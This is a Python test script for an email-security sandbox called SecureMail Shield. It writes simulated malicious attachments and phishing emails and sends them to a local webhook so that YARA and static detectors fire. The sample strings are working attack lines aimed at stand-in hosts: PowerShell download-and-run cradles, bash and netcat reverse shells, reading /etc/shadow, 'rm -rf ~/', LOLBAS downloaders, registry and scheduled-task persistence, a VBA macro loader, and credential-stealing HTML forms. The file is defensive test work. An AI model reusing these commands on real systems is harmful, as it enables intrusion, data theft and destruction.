#!/usr/bin/env python
"""
SecureMail Shield — Kit de pruebas del sandbox.

Uso (PowerShell, desde la raíz del proyecto):

    # 1) Crea al menos un alias en la web (http://127.0.0.1:8000/alias/)
    # 2) Asegúrate de haber hecho migrate y rebuild de la imagen Docker:
    #      python manage.py migrate
    #      docker build -t email_seguro_sandbox -f Dockerfile.sandbox .
    # 3) Arranca el servidor Django en otra terminal:
    #      python manage.py runserver
    # 4) Ejecuta este script:
    #      python test_samples/run_tests.py --alias TU_ALIAS@securemail.com
    #
    # Opcional: lanzar un solo test por su número
    #      python test_samples/run_tests.py --alias ... --only 3

Genera adjuntos inofensivos en /tmp y los manda al endpoint /webhook/inbound/.
Ningún archivo contiene código ejecutable real — solo strings que disparan
los detectores (YARA + analizadores estáticos del sandbox).
"""
import argparse
import sys
import tempfile
import zipfile
import time
from pathlib import Path

try:
    import requests
except ImportError:
    print("Instala requests:  pip install requests")
    sys.exit(1)

RESET = "\033[0m"; BOLD = "\033[1m"
RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"; BLUE = "\033[94m"
PURPLE = "\033[95m"; GRAY = "\033[90m"


# ───────────────────────────────────────────────────────────────────────
#  Generadores de adjuntos (todos inofensivos — solo strings/metadatos)
# ───────────────────────────────────────────────────────────────────────

def sample_powershell_loader(path: Path):
    """PowerShell loader típico — debería disparar YARA + script_pattern."""
    content = """
# Documento inofensivo — simulación para el sandbox de SecureMail Shield.
# Contiene strings que un loader real tendría pero NO ejecuta nada.
$url = "http://malicious-example.com/payload.exe"
IEX(New-Object Net.WebClient).DownloadString($url)
Invoke-WebRequest -Uri $url -OutFile "C:\\Users\\Public\\x.exe"
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SGVsbG8=
Set-MpPreference -DisableRealtimeMonitoring $true
"""
    path.write_text(content, encoding="utf-8")


def sample_reverse_shell_sh(path: Path):
    """Reverse shell clásica de bash — dispara YARA Reverse_Shell_Bash."""
    content = """#!/bin/bash
# simulación no ejecutable
bash -i >& /dev/tcp/192.0.2.10/4444 0>&1
nc -e /bin/sh 192.0.2.10 4444
cat /etc/shadow
rm -rf ~/
curl http://malicious.example/drop.bin -o /tmp/x
"""
    path.write_text(content, encoding="utf-8")


def sample_bat_lolbas(path: Path):
    """Batch con técnicas LOLBAS — dispara LOLBAS_Living_Off_The_Land."""
    content = """@echo off
REM simulación — no ejecutar
certutil -urlcache -split -f "http://malicious.example/payload.exe" x.exe
certutil -decode in.b64 out.exe
bitsadmin /transfer job /download /priority high http://mal.example/x.exe C:\\x.exe
powershell -enc SGVsbG8=
regsvr32 /s /n /u /i:http://mal.example/x.sct scrobj.dll
mshta http://mal.example/x.hta
schtasks /create /sc minute /mo 1 /tn "Persist" /tr "C:\\x.exe"
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d "C:\\x.exe"
"""
    path.write_text(content, encoding="utf-8")


def sample_pdf_with_js(path: Path):
    """PDF con /JavaScript + /OpenAction. Válido pero inofensivo."""
    content = b"""%PDF-1.3
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R /AcroForm 5 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
4 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert('simulated JS from PDF'); eval('1+1'); util.printd('fake',new Date()); ) >>
endobj
5 0 obj
<< /Fields [] >>
endobj
xref
0 6
0000000000 65535 f
0000000015 00000 n
0000000089 00000 n
0000000138 00000 n
0000000198 00000 n
0000000310 00000 n
trailer
<< /Size 6 /Root 1 0 R >>
startxref
342
%%EOF
"""
    path.write_bytes(content)


def sample_double_extension(path: Path):
    """Archivo llamado factura.pdf.exe pero realmente texto — dispara double_extension."""
    # El path ya viene con doble extensión
    path.write_text("Archivo inofensivo renombrado con doble extensión.\n", encoding="utf-8")


def sample_clean_text(path: Path):
    """Archivo limpio — no debería disparar nada (score 0 safe)."""
    path.write_text(
        "Hola, gracias por tu compra.\n"
        "Adjuntamos los detalles de tu pedido en formato texto.\n"
        "Atentamente, el equipo.\n",
        encoding="utf-8",
    )


def sample_html_phishing(path: Path):
    """HTML con formulario de credenciales — dispara Phishing_Credentials_Form."""
    content = """<!doctype html>
<html><body>
<h2>Verifica tu cuenta</h2>
<form action="http://phishing-example.com/steal" method="post">
  <input type="email" name="email">
  <input type="password" name="password">
  <button>Iniciar sesión</button>
</form>
<iframe src="http://tracker-evil.example/pixel"></iframe>
</body></html>
"""
    path.write_text(content, encoding="utf-8")


def sample_zip_with_exe(path: Path):
    """ZIP con un archivo renombrado a .exe dentro — dispara dangerous_inside."""
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("leeme.txt", "Contenido inofensivo\n")
        z.writestr("update.exe", b"MZ\x90\x00fake-not-a-real-pe-just-the-MZ-header\n")


def sample_vba_stub(path: Path):
    """Archivo con strings típicos de macro VBA — dispara yara Office_Macro_Loader."""
    # No genero un .docx real (complejo) — solo un texto con los strings clave.
    # El sandbox lo detectará por el string scan de fallback.
    content = """Sub AutoOpen()
    Dim s As String
    s = "http://malicious-example.com/payload.exe"
    Shell "powershell -NoProfile -Command (New-Object Net.WebClient).DownloadFile('" & s & "','C:\\x.exe')"
End Sub

Private Sub Document_Open()
    Set WS = CreateObject("WScript.Shell")
    WS.Run "cmd.exe /c powershell -enc SGVsbG8="
End Sub
"""
    path.write_text(content, encoding="utf-8")


def sample_lnk_fake(path: Path):
    """Binario que simula un .lnk con strings sospechosos — dispara lnk_target."""
    # LNK real tiene un formato binario complejo; aquí basta un binario que
    # contenga los strings que busca script_analyzer._analyze_lnk.
    blob = b"L\x00\x00\x00" + b"\x00" * 20
    blob += b"powershell -NoProfile -WindowStyle Hidden -EncodedCommand "
    blob += b"aGVsbG8=" * 8
    blob += b"\x00http://malicious-example.com/x.exe\x00"
    path.write_bytes(blob)


# ───────────────────────────────────────────────────────────────────────
#  Lista de tests
# ───────────────────────────────────────────────────────────────────────
# (id, filename, generator_fn, sender, subject, body_plain, body_html,
#  expected_score_range, expected_triggers)

TESTS = [
    (
        1, "update.ps1", sample_powershell_loader,
        "soporte@actualizaciones-ficticias.tk",
        "[URGENTE] Actualización crítica de tu cuenta",
        "Ejecuta este parche de seguridad cuanto antes, tu cuenta será suspendida.",
        "",
        (80, 100),
        ["YARA Suspicious_Powershell_Loader", "script_pattern IEX/DownloadString",
         "Powershell_Encoded_Command", "Defender_Tampering"],
    ),
    (
        2, "reverse.sh", sample_reverse_shell_sh,
        "it-admin@linux-oficial.ml",
        "script de diagnóstico — ejecuta por favor",
        "corre el script adjunto para diagnosticar el problema.",
        "",
        (80, 100),
        ["YARA Reverse_Shell_Bash", "YARA Reverse_Shell_Netcat",
         "script_pattern /dev/tcp", "/etc/shadow"],
    ),
    (
        3, "install.bat", sample_bat_lolbas,
        "soporte@microsoft-oficial.win",
        "Instalador oficial — ejecutar como administrador",
        "Haz doble clic para instalar la actualización.",
        "",
        (80, 100),
        ["YARA LOLBAS_Living_Off_The_Land", "certutil", "bitsadmin",
         "YARA Persistence_Registry_Run"],
    ),
    (
        4, "factura_2026.pdf", sample_pdf_with_js,
        "facturacion@empresa-legitima.com",
        "Factura 2026 pendiente de pago",
        "Adjuntamos tu factura en PDF.",
        "",
        (70, 100),
        ["pdf_pattern /JS", "pdf_pattern /OpenAction",
         "pdf_pattern eval(", "YARA PDF_Embedded_JS_Action"],
    ),
    (
        5, "factura.pdf.exe", sample_double_extension,
        "facturacion@shop-supuesto.top",
        "Su factura digital",
        "Abra el PDF adjunto.",
        "",
        (85, 100),
        ["double_extension", "extension_spoof", "dangerous_extension .exe"],
    ),
    (
        6, "pedido.txt", sample_clean_text,
        "ventas@tienda-legit.com",
        "Confirmación de tu pedido",
        "Gracias por tu compra. Adjuntamos los detalles.",
        "",
        (0, 30),
        ["(sin indicadores — archivo limpio)"],
    ),
    (
        7, "verifica.html", sample_html_phishing,
        "security@paypaI.evil-domain.click",
        "Verifica tu cuenta — acción urgente",
        "Tu cuenta será suspendida en 24h, verifica tu identidad.",
        "<html><body>Click aquí: <a href='http://phish.example'>paypal.com</a></body></html>",
        (70, 100),
        ["YARA Phishing_Credentials_Form", "html_credential_form",
         "url_suspicious_tld (.click)", "from_brand_impersonation"],
    ),
    (
        8, "actualizacion.zip", sample_zip_with_exe,
        "update@software-supuesto.ga",
        "Parche 2026.04 — imprescindible",
        "Descomprima y ejecute para aplicar el parche.",
        "",
        (80, 100),
        ["archive_contents", "dangerous_inside .exe"],
    ),
    (
        9, "documento_importante.docx", sample_vba_stub,
        "rrhh@empresa-real.ml",
        "Contrato para firma",
        "Abra el documento y active las macros para poder firmar.",
        "",
        (70, 100),
        ["YARA Office_Macro_Loader", "string_match AutoOpen/Shell/powershell"],
    ),
    (
        10, "receipt.pdf.lnk", sample_lnk_fake,
        "no-reply@delivery-example.com",
        "Tu envío ha sido entregado",
        "Ver detalles del envío adjunto.",
        "",
        (75, 100),
        ["format .lnk", "lnk_target powershell", "lnk_target -EncodedCommand"],
    ),
    # Test solo con cuerpo (sin adjunto) — prueba body_analyzer
    (
        11, None, None,
        "security@paypal-verify.tk",
        "⚠️ Verifica tu cuenta urgente",
        "Hola, detectamos actividad sospechosa en tu cuenta. "
        "Haz clic aquí para verificar tu identidad: http://paypal.evil-example.zip "
        "o accede a http://192.0.2.50/login desde tu correo.",
        "<html><body>"
        "<p>Verifica tu cuenta <a href='http://phishing.example/login'>https://paypal.com</a></p>"
        "<form action='http://steal.example'><input type='password' name='p'></form>"
        "</body></html>",
        (70, 100),
        ["link_spoofing", "url_brand_impersonation paypal",
         "url_suspicious_tld (.tk, .zip)", "phishing_language",
         "html_credential_form", "subject_alarmism"],
    ),
    # MÚLTIPLES ADJUNTOS — el webhook debe procesar los dos y reportarlos
    # por separado. (Este test es especial, lo maneja send_multi_attachment_test)
    (
        12, "MULTI",
        [("reverse.sh", sample_reverse_shell_sh), ("install.bat", sample_bat_lolbas)],
        "it@empresa-falsa.ga",
        "Revisa estos 2 scripts de mantenimiento",
        "Buenos días, adjunto los dos scripts para el cron del servidor.",
        "",
        (80, 100),
        ["2 adjuntos con score alto", "evidencia por archivo", "reverse_shell",
         "LOLBAS", "threat_name combinado"],
    ),
    # MÚLTIPLES URLS EN BODY — debe listarlas todas en IOCs y analizarlas
    (
        13, None, None,
        "newsletter@promo-falsas.top",
        "3 ofertas exclusivas solo hoy",
        "Hola! Aprovecha estas 3 ofertas:\n"
        "1) http://bit.ly/oferta-xyz\n"
        "2) http://amazon.tienda-falsa.click/offer?id=1\n"
        "3) http://192.0.2.77/promo\n"
        "¡No te las pierdas!",
        "",
        (55, 100),
        ["3 URLs listadas en IOCs", "url_shortener bit.ly",
         "url_brand_impersonation amazon", "url_ip_host 192.0.2.77",
         "url_suspicious_tld (.top, .click)"],
    ),
    # MÚLTIPLES EJECUTABLES (PE "falsos") — prueba score agregado
    (
        14, "MULTI",
        [("update1.ps1", sample_powershell_loader),
         ("update2.sh",  sample_reverse_shell_sh),
         ("bonus.bat",   sample_bat_lolbas)],
        "ceo@empresa-suplantada.ml",
        "FW: Actualizaciones requeridas · 3 scripts",
        "Ejecuta estos 3 para dejar el servidor al día. Urgente.",
        "",
        (85, 100),
        ["3 adjuntos maliciosos", "cada uno con evidencia propia",
         "veredicto agregado = peor de los 3"],
    ),
]


# ───────────────────────────────────────────────────────────────────────
#  Runner
# ───────────────────────────────────────────────────────────────────────

def send_test(url: str, alias: str, test) -> None:
    test_id, filename, gen, sender, subject, body, body_html, score_range, triggers = test

    # Detectar tests con múltiples adjuntos: filename="MULTI", gen=[(n,f), ...]
    is_multi = (filename == "MULTI" and isinstance(gen, list))

    print(f"\n{BOLD}{PURPLE}━━━ TEST {test_id:02d} · {sender} ━━━{RESET}")
    print(f"  asunto:    {subject}")
    if is_multi:
        names = ", ".join(n for n, _ in gen)
        print(f"  adjuntos:  {BOLD}{len(gen)}{RESET} archivos → {names}")
    elif filename:
        print(f"  adjunto:   {filename}")
    else:
        print(f"  adjunto:   {GRAY}(solo cuerpo del correo){RESET}")
    print(f"  {YELLOW}score esperado: {score_range[0]}-{score_range[1]}{RESET}")
    print(f"  {GRAY}debería disparar: {', '.join(triggers[:3])}"
          f"{'...' if len(triggers) > 3 else ''}{RESET}")

    data = {
        "recipient": alias,
        "sender":    sender,
        "subject":   subject,
        "body-plain": body,
        "body-html": body_html,
    }
    files = {}            # clave → (filename, fileobj)
    open_handles = []     # para cerrar al final

    tmp_dir = Path(tempfile.gettempdir()) / "securemail_samples"
    tmp_dir.mkdir(exist_ok=True)

    try:
        if is_multi:
            # Múltiples adjuntos → attachment-1, attachment-2, ...
            for idx, (fname, fn) in enumerate(gen, start=1):
                tmp_path = tmp_dir / fname
                try:
                    fn(tmp_path)
                except Exception as e:
                    print(f"  {RED}error generando {fname}: {e}{RESET}")
                    continue
                handle = open(tmp_path, "rb")
                open_handles.append(handle)
                files[f"attachment-{idx}"] = (fname, handle)
        elif filename and gen:
            tmp_path = tmp_dir / filename
            try:
                gen(tmp_path)
            except Exception as e:
                print(f"  {RED}error generando {filename}: {e}{RESET}")
                return
            handle = open(tmp_path, "rb")
            open_handles.append(handle)
            files["attachment-1"] = (filename, handle)

        try:
            r = requests.post(url, data=data, files=files, timeout=120)
            if r.status_code == 200:
                print(f"  {GREEN}✓ enviado OK{RESET}  ({r.status_code})")
            else:
                print(f"  {RED}✗ {r.status_code}: {r.text[:200]}{RESET}")
        except requests.exceptions.ConnectionError:
            print(f"  {RED}✗ no se pudo conectar a {url}{RESET}")
            print(f"  {GRAY}  ¿está corriendo 'python manage.py runserver'?{RESET}")
        except Exception as e:
            print(f"  {RED}✗ error: {e}{RESET}")
    finally:
        for h in open_handles:
            try: h.close()
            except Exception: pass


def main():
    parser = argparse.ArgumentParser(
        description="Envía correos de prueba al webhook del sandbox.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--alias", required=True,
                        help="Dirección del alias receptor (ej. prueba_xxx@securemail.com).")
    parser.add_argument("--url", default="http://127.0.0.1:8000/webhook/inbound/",
                        help="URL del webhook (default: localhost).")
    parser.add_argument("--only", type=int, default=None,
                        help="Ejecuta solo el test indicado (1-11).")
    parser.add_argument("--sleep", type=float, default=1.5,
                        help="Segundos entre tests (default: 1.5, para dar tiempo al sandbox).")
    args = parser.parse_args()

    print(f"{BOLD}{BLUE}")
    print("┌─ SecureMail Shield · Test kit del sandbox ─────────────────┐")
    print(f"│  webhook: {args.url:<50}│")
    print(f"│  alias:   {args.alias:<50}│")
    print("└────────────────────────────────────────────────────────────┘")
    print(RESET)

    tests_to_run = TESTS
    if args.only:
        tests_to_run = [t for t in TESTS if t[0] == args.only]
        if not tests_to_run:
            print(f"{RED}No existe el test {args.only}. Rango válido: 1-{len(TESTS)}.{RESET}")
            return

    for t in tests_to_run:
        send_test(args.url, args.alias, t)
        if args.sleep and t is not tests_to_run[-1]:
            time.sleep(args.sleep)

    print(f"\n{BOLD}{GREEN}✓ Fin.{RESET} Abre:")
    print(f"  {BLUE}http://127.0.0.1:8000/bandeja/{RESET}  (correos recibidos)")
    print(f"  {BLUE}http://127.0.0.1:8000/sandbox/{RESET}  (análisis con filtros)")
    print(f"  y haz click en cada reporte para ver la evidencia detallada.\n")


if __name__ == "__main__":
    main()
